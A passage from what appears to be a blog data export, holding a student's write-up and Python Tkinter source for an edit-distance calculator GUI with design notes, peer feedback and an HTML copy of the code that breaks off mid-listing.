alignment.\n##DESIGN##\nThe frame work of the design is shown below.\n![](/image/20151017design.jpg)\nThe blue boxes in Figure 1 is the frame I use. In order to align those boxes, I use many frames to get a better effect.\nFigure 2 is my initial design\n![](/image/20151017hand.jpg)\n##FEEDBACK##\n- **Yi Hu**: The GUI is neat and user-friendly. People without read me file can use it.\n- **XinYang Zhang**: This GUI looks compact and satisfies the requirements.\n- **Robert Brotzman - smith**: I think that is good. I would change the names of the strings to someting more meaningful as well as the operation names. Also maybe add names to the buttons to add files.\nFor Robert's suggestion, I changed my strings to \"deletion\", \"insertion\" and \"substitution\". Which is used in the homework assignment. For the \"add file\", I changed my \"...\" to \"open\". Thank him.\n##RUN CAPTURE##\nFigure 3-6 is the screenshot of this software.\n![Figure 3](/image/201510171.png)\n![Figure 4](/image/201510175.png)\n![Figure 5](/image/201510173.png)\n![Figure 6](/image/201510174.png)\n\n##CODE##\n```\nfrom Tkinter import *\nfrom tkFileDialog import *\nfrom tkSimpleDialog import *\nfrom array import *\n\n#this is the main class actually I only have ONE class\n\nclass application(Frame):\n\n    #this is the calculation part\n    def cal(self):\n        #get the value of S and T\n        S = self.textS.get(\"1.0\", END)\n        T = self.textT.get(\"1.0\", END)\n        lens = len(S)\n        lent = len(T)\n        if lens == 1 and lent == 1: \n            return \n        self.maxlen = 2\n        #init the dp and bk with 0 and -\n        #bk is the backtrack matrix\n        #dp is the full edit matrix\n        dp = [([0] * lent) for i in range(lens)]\n        bk = [(['-'] * lent) for i in range(lens)]\n\n        #init the first line and first colume\n        for i in range(1,lent):\n            dp[0][i] = dp[0][i - 1] + self.Sci.get()\n            bk[0][i] = '-'\n        for i in range(1,lens):\n            dp[i][0] = dp[i - 1][0] + self.Scd.get()\n            bk[i][0] = '|'\n\n        #use the DP formula to get the full edit matrix and backtrack matrix\n        for i in range(1,lens):\n            for j in range(1,lent):\n                if S[i - 1] == T[j - 1]:\n                    dp[i][j] = dp[i - 1][j - 1]\n                    bk[i][j] = '\\\\'\n                else: \n                    dp[i][j] = min(dp[i - 1][j] + self.Scd.get(), dp[i][j - 1] + self.Sci.get(), dp[i - 1][j - 1] + self.Scs.get())\n                    if dp[i][j] == dp[i - 1][j] + self.Scd.get():\n                        bk[i][j] = '|'\n                    if dp[i][j] == dp[i - 1][j - 1] + self.Scs.get():\n                        bk[i][j] = '\\\\'\n                #here I get the max lenth of all the numbers. To help align the output\n                self.maxlen = max(len(str(dp[i][j])),self.maxlen)\n        #here between every two numbers I got 2 spaces\n        self.maxlen += 2\n        #output the backtrack matrix\n        self.Dis.delete(first = 0, last = END)\n        self.Dis.insert(END, dp[lens - 1][lent - 1])\n        if self.backtrack.get() == TRUE:\n            self.BM.insert(END, '\\n--------------\\n')\n            self.BM.insert(END, '    ')\n            for i in range(0,lent - 1):\n                self.BM.insert(END, '  ' + T[i])\n            self.BM.insert(END, '\\n   0')\n            for i in range(0,lens):\n                if i != 0:\n                    self.BM.insert(END, S[i - 1])\n                for j in range(0,lent):\n                    if i == 0 and j == 0:\n                        continue\n                    if i == 0:\n                        self.BM.insert(END, '  -')\n                    if j == 0:\n                        self.BM.insert(END, '  |')\n                    if i != 0 and j != 0:\n                        self.BM.insert(END, '  ' + bk[i][j])\n                self.BM.insert(END, '\\n')\n\n        #if the full edit check button is selected, output the full edit matrix\n        if self.fulledit.get() == TRUE:\n            self.FD.insert(END, '\\n--------------\\n')\n            self.FD.insert(END, ' ' * self.maxlen * 2)\n            for i in range(0,lent - 1):\n                self.FD.insert(END, T[i].ljust(self.maxlen))\n            self.FD.insert(END, '\\n' + ' ' * self.maxlen)\n            for i in range(0,lens):\n                if i != 0:\n                    self.FD.insert(END, S[i - 1].ljust(self.maxlen))\n                for j in range(0,lent):\n                    self.FD.insert(END, str(dp[i][j]).ljust(self.maxlen))\n                self.FD.insert(END, '\\n')\n\n        #if hte alignment check box is selected, output the alignment\n        if self.align.get() == TRUE:\n            self.AL.insert(END, '\\n--------------\\n')\n            j = lent - 1\n            i = lens - 1\n            res = []\n            while TRUE:\n                #get the backtrack path\n                res.append(bk[i][j])\n                if bk[i][j] == '\\\\':\n                    i -= 1\n                    j -= 1\n                elif bk[i][j] == '|':\n                    i -= 1\n                elif bk[i][j] == '-':\n                    j -= 1\n                if i == 0 and j == 0:\n                    break\n            #reverse the backtrack path\n            res.reverse()\n\n            i = j = k = 0\n            #init the So, way and Ta list. which stores source, way, target information\n            So = ['a'] * len(res)\n            way = ['a'] * len(res)\n            Ta = ['a'] * len(res)\n            for p in range(len(res)):\n                if res[p] == '\\\\':\n                    So[k] = S[i]\n                    Ta[k] = T[j]\n                    if S[i] == T[j]:\n                        way[k] = '|'\n                    else:\n                        way[k] = ' '\n                    i += 1\n                    j += 1\n                if res[p] == '|':\n                    So[k] = S[i]\n                    Ta[k] = '-'\n                    way[k] = ' '\n                    i += 1\n                if res[p] == '-':\n                    So[k] = '-'\n                    Ta[k] = T[j]\n                    way[k] = ' '\n                    j += 1\n                k += 1\n            for i in range(len(res)):\n                self.AL.insert(END, ' ' + So[i])\n            self.AL.insert(END, '\\n')\n            for i in range(len(res)):\n                self.AL.insert(END, ' ' + way[i])\n            self.AL.insert(END, '\\n')\n            for i in range(len(res)):\n                self.AL.insert(END, ' ' + Ta[i])\n            self.AL.insert(END, '\\n')\n\n\n\n\n\n\n\n    #this function is used to init the class\n\n    def __init__(self, master):\n        Frame.__init__(self,master)\n        self.Sci = 1\n        self.Scd = 1\n        self.Scs = 1\n        self.maxlen = 2\n        self.pack()\n        self.create()\n\n    #this function is used to change the range of step cost\n    def changeRange(self):\n        while(TRUE):\n            Range = askinteger(\"Update the Range\",\"Please input the range\")\n            if Range > 0:\n                break\n            if Range == None:\n                break\n        self.Scd.config(to = Range)\n        self.Sci.config(to = Range)\n        self.Scs.config(to = Range)\n\n    #this function is used to show the menu bar\n    def menu(self):\n        menu = Menu()\n        self.master.config(menu = menu)\n        option = Menu(menu)\n        menu.add_cascade(label = \"Option\", menu = option)\n        option.add_command(label = \"Range of modify cost\", command = self.changeRange)\n\n\n    #this function is used to get the text boxes which appear at the bottom of the GUI\n    def getOut(self, name,father):\n        self.frm = LabelFrame(father, text = name, padx = 10, pady = 5)\n        lb = Text(self.frm, width = 30, wrap = NONE)\n        lb.config(font = (\"Courier\", 10))\n        sl = Scrollbar(self.frm)\n        sl.set(0.5,1)\n        sl.pack(side = RIGHT, fill = Y)\n        lb['yscrollcommand'] = sl.set\n        lb.pack(side = LEFT)\n        sl['command'] = lb.yview\n\n        sl = Scrollbar(self.frm, orient = HORIZONTAL)\n        sl.set(0.5,1)\n        sl.pack(fill = X)\n        lb['xscrollcommand'] = sl.set\n        lb.pack(side = TOP)\n        sl['command'] = lb.xview\n        self.frm.pack(side = LEFT)\n        return lb\n\n\n    #read S and T from files\n    def getFileS(self):\n        fd = askopenfilename()\n        if fd == \"\":\n            return \n        tmpfile = open(fd,\"r\")\n        self.textS.delete(\"1.0\", END)\n        self.textS.insert(\"1.0\", tmpfile.readline()[:-1])\n        tmpfile.close()\n\n    def getFileT(self):\n        fd = askopenfilename()\n        if fd == \"\":\n            return \n        tmpfile = open(fd,\"r\")\n        self.textT.delete(\"1.0\", END)\n        self.textT.insert(\"1.0\", tmpfile.readline()[:-1])\n        tmpfile.close()\n\n    #main function to show the GUI\n    def create(self):\n        self.menu()\n        Input = LabelFrame(self, text = \"Input\", padx = 10, pady = 5)\n\n        #input part\n        frm_L = LabelFrame(Input, text = \"Input S & T\", padx = 10, pady = 5)\n        \n        #the S and T input part\n        self.frm_LS = Frame(frm_L)\n        Label(self.frm_LS, text = \"S\", font = ('Arial', 12), padx = 10).pack(side = LEFT)\n        self.textS = Text(self.frm_LS,height = 3, width = 18, padx = 10)\n        self.textS.pack(side = LEFT)\n        Button(self.frm_LS, text = \"Open\", command = self.getFileS).pack(side = LEFT)\n        self.frm_LS.pack(side = TOP)\n\n        frm_LT = Frame(frm_L)\n        Label(frm_LT, text = \"T\", font = ('Arial', 12), padx = 10).pack(side = LEFT)\n        self.textT = Text(frm_LT,height = 3, width = 18, padx = 10)\n        self.textT.pack(side = LEFT)\n        Button(frm_LT, text = \"Open\", command = self.getFileT).pack(side = LEFT)\n        frm_LT.pack(side = TOP)\n\n        frm_L.pack(side = LEFT)\n\n        #the distance input part\n        frm_M = LabelFrame(Input, text = \"Cost of modify\", padx = 10, pady = 5)\n\n        frm_Mcd = Frame(frm_M)\n        Label(frm_Mcd, text = \"deletion\", font = ('Arial', 11), width = 10).pack(side = LEFT)\n        self.Scd = Scale(frm_Mcd, orient = HORIZONTAL, width = 10, from_ = 1, to = 5)\n        self.Scd.pack(side = LEFT)\n        frm_Mcd.pack(side = TOP)\n\n\n        frm_Mci = Frame(frm_M)\n        Label(frm_Mci, text = \"insertion\", font = ('Arial', 11), width = 10).pack(side = LEFT)\n        self.Sci = Scale(frm_Mci, orient = HORIZONTAL, width = 10, from_ = 1, to = 5)\n        self.Sci.pack(side = LEFT)\n        frm_Mci.pack(side = TOP)\n\n\n        frm_Mcs = Frame(frm_M)\n        Label(frm_Mcs, text = \"substitution\", font = ('Arial', 11), width = 10).pack(side = LEFT)\n        self.Scs = Scale(frm_Mcs, orient = HORIZONTAL, width = 10, from_ = 1, to = 5)\n        self.Scs.pack(side = LEFT)\n        frm_Mcs.pack(side = TOP)\n\n\n\n        #the check box input part\n        frm_R = LabelFrame(Input, text = \"Pick the output\", padx = 10, pady = 5)\n\n        self.fulledit = BooleanVar()\n        Checkbutton(frm_R, text = \"full edit\",height = 2, width = 18, anchor = W, variable = self.fulledit).pack(side = TOP, anchor = W)\n        self.backtrack = BooleanVar()\n        Checkbutton(frm_R, text = \"backtrack matrix\", height = 2, width = 18, anchor = W, variable = self.backtrack).pack(side = TOP, anchor = W)\n        self.align = BooleanVar()\n        Checkbutton(frm_R, text = \"alignment\", height = 2, width = 18, anchor = W, variable = self.align).pack(side = TOP, anchor = W)\n\n        convert = Frame(self)\n        Button(convert, text = \"Compare\", command = self.cal).pack()\n\n\n        #this is the output part\n        output = LabelFrame(self, text = \"Output\", padx = 10)\n        Disfrm = Frame(output, padx = 10, pady = 5)\n        Label(Disfrm, text = \"Distance\", padx = 10).pack(side = LEFT)\n        self.Dis = Entry(Disfrm, width = 10)\n        self.Dis.pack(side = LEFT)\n        Disfrm.pack(side = TOP)\n\n        #get three textboxes which is the full edit, backtrack matrix and alignment text boxes\n        self.FD = self.getOut(\"full edit\", output)\n        self.BM = self.getOut(\"backtrack matrix\", output)\n        self.AL = self.getOut(\"alignment\", output)\n\n        frm_L.pack(side = LEFT)\n        frm_M.pack(side = LEFT)\n        frm_R.pack(side = LEFT)\n\n        Input.pack()\n        convert.pack()\n        output.pack()\n\nif __name__ == \"__main__\":\n    root = Tk()\n    root.title(\"Distance Calculator\")\n    root.geometry(\"900x700\")\n    root.resizable(width = True, height = True)\n\n    app = application(root)\n    root.mainloop()\n```\n","slug":"DistanceCalculatorGUI","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681uc000bwypdcu3cr9r6","content":"<p>Everyone want to calculate the distance between his Goddess and himself. This calculator can meet your need!<br>This is the first time that I use Python to generate a calculator.</p>\n<p>##AIM##<br>This program is used to get a GUI software for a edit distance calculator<br><a id=\"more\"></a></p>\n<p>##USAGE##</p>\n<ul>\n<li><strong>Use python to run</strong>: Use <em>python distance.py</em> to run this program</li>\n<li><strong>Input</strong>: The input part is located at the top of this GUI. <ul>\n<li>First is the input of S and T, which is the source string and the target string. The button behind the input box is used to choose a file to get the S and T. <strong>Attention that only the FIRST LINE of the selected file will be read into the input box</strong></li>\n<li>Second is the input of step cost of insertion, deletion and substitution a letter. <strong>The range of the input could be adjusted at the menu bar, under</strong> <em>Option</em> </li>\n<li>The part after that is the check boxes of output. Users can choose to show the full edit matrix, backtrack matrix and the alignment. </li>\n</ul>\n</li>\n<li><strong>Output</strong>: The output is located at the bottom of the GUI. It’s the distance, full edit matrix, backtrack matrix and the alignment.<br>##DESIGN##<br>The frame work of the design is shown below.<br><img src=\"/image/20151017design.jpg\" alt=\"\"><br>The blue boxes in Figure 1 is the frame I use. In order to align those boxes, I use many frames to get a better effect.<br>Figure 2 is my initial design<br><img src=\"/image/20151017hand.jpg\" alt=\"\"><br>##FEEDBACK##</li>\n<li><strong>Yi Hu</strong>: The GUI is neat and user-friendly. People without read me file can use it.</li>\n<li><strong>XinYang Zhang</strong>: This GUI looks compact and satisfies the requirements.</li>\n<li><strong>Robert Brotzman - smith</strong>: I think that is good. I would change the names of the strings to someting more meaningful as well as the operation names. Also maybe add names to the buttons to add files.<br>For Robert’s suggestion, I changed my strings to “deletion”, “insertion” and “substitution”. Which is used in the homework assignment. For the “add file”, I changed my “…” to “open”. Thank him.<br>##RUN CAPTURE##<br>Figure 3-6 is the screenshot of this software.<br><img src=\"/image/201510171.png\" alt=\"Figure 3\"><br><img src=\"/image/201510175.png\" alt=\"Figure 4\"><br><img src=\"/image/201510173.png\" alt=\"Figure 5\"><br><img src=\"/image/201510174.png\" alt=\"Figure 6\"></li>\n</ul>\n<p>##CODE##<br><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Tkinter import *</span><br><span class=\"line\">from tkFileDialog import *</span><br><span class=\"line\">from tkSimpleDialog import *</span><br><span class=\"line\">from array import *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#this is the main class actually I only have ONE class</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">application</span>(<span class=\"title\">Frame</span>):</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this is the calculation part</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cal</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        <span class=\"comment\">#get the value of S and T</span></span><br><span class=\"line\">        S = <span class=\"keyword\">self</span>.textS.get(<span class=\"string\">\"1.0\"</span>, <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        T = <span class=\"keyword\">self</span>.textT.get(<span class=\"string\">\"1.0\"</span>, <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        lens = len(S)</span><br><span class=\"line\">        lent = len(T)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> lens == <span class=\"number\">1</span> <span class=\"keyword\">and</span> lent == <span class=\"number\">1</span>: </span><br><span class=\"line\">            <span class=\"keyword\">return</span> </span><br><span class=\"line\">        <span class=\"keyword\">self</span>.maxlen = <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"comment\">#init the dp and bk with 0 and -</span></span><br><span class=\"line\">        <span class=\"comment\">#bk is the backtrack matrix</span></span><br><span class=\"line\">        <span class=\"comment\">#dp is the full edit matrix</span></span><br><span class=\"line\">        dp = [([<span class=\"number\">0</span>] * lent) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lens)]</span><br><span class=\"line\">        bk = [([<span class=\"string\">'-'</span>] * lent) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lens)]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#init the first line and first colume</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,lent):</span><br><span class=\"line\">            dp[<span class=\"number\">0</span>][i] = dp[<span class=\"number\">0</span>][i - <span class=\"number\">1</span>] + <span class=\"keyword\">self</span>.Sci.get()</span><br><span class=\"line\">            bk[<span class=\"number\">0</span>][i] = <span class=\"string\">'-'</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,lens):</span><br><span class=\"line\">            dp[i][<span class=\"number\">0</span>] = dp[i - <span class=\"number\">1</span>][<span class=\"number\">0</span>] + <span class=\"keyword\">self</span>.Scd.get()</span><br><span class=\"line\">            bk[i][<span class=\"number\">0</span>] = <span class=\"string\">'|'</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#use the DP formula to get the full edit matrix and backtrack matrix</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,lens):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,lent):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> S[i - <span class=\"number\">1</span>] == T[j - <span class=\"number\">1</span>]:</span><br><span class=\"line\">                    dp[i][j] = dp[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>]</span><br><span class=\"line\">                    bk[i][j] = <span class=\"string\">'\\\\'</span></span><br><span class=\"line\">                <span class=\"symbol\">else:</span> </span><br><span class=\"line\">                    dp[i][j] = min(dp[i - <span class=\"number\">1</span>][j] + <span class=\"keyword\">self</span>.Scd.get(), dp[i][j - <span class=\"number\">1</span>] + <span class=\"keyword\">self</span>.Sci.get(), dp[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>] + <span class=\"keyword\">self</span>.Scs.get())</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> dp[i][j] == dp[i - <span class=\"number\">1</span>][j] + <span class=\"keyword\">self</span>.Scd.get():</span><br><span class=\"line\">                        bk[i][j] = <span class=\"string\">'|'</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> dp[i][j] == dp[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>] + <span class=\"keyword\">self</span>.Scs.get():</span><br><span class=\"line\">                        bk[i][j] = <span class=\"string\">'\\\\'</span></span><br><span class=\"line\">                <span class=\"comment\">#here I get the max lenth of all the numbers. To help align the output</span></span><br><span class=\"line\">                <span class=\"keyword\">self</span>.maxlen = max(len(str(dp[i][j])),<span class=\"keyword\">self</span>.maxlen)</span><br><span class=\"line\">        <span class=\"comment\">#here between every two numbers I got 2 spaces</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.maxlen += <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"comment\">#output the backtrack matrix</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Dis.delete(first = <span class=\"number\">0</span>, last = <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Dis.insert(<span class=\"keyword\">END</span>, dp[lens - <span class=\"number\">1</span>][lent - <span class=\"number\">1</span>])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">self</span>.backtrack.get() == <span class=\"symbol\">TRUE:</span></span><br><span class=\"line\">            <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n--------------\\n'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'    '</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lent - <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'  '</span> + T[i])</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n   0'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lens):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, S[i - <span class=\"number\">1</span>])</span><br><span class=\"line\">                <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lent):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i == <span class=\"number\">0</span> <span class=\"keyword\">and</span> j == <span class=\"number\">0</span>:</span><br><span class=\"line\">                        continue</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i == <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'  -'</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> j == <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'  |'</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i != <span class=\"number\">0</span> <span class=\"keyword\">and</span> j != <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'  '</span> + bk[i][j])</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span 